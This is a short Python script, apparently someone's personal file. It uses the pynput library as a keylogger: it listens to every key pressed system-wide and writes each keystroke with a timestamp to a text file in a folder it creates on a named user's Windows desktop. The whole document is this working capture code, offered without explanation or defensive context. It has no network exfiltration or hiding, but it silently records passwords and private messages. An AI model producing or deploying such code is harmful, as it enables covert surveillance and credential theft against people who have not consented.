from pynput.keyboard import Key, Listener
import logging, os
os.mkdir("C:/Users/jkrai/OneDrive/Desktop/lumber")
log_dir = "C:/Users/jkrai/OneDrive/Desktop/lumber/w"

logging.basicConfig(filename=(log_dir + "oo.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
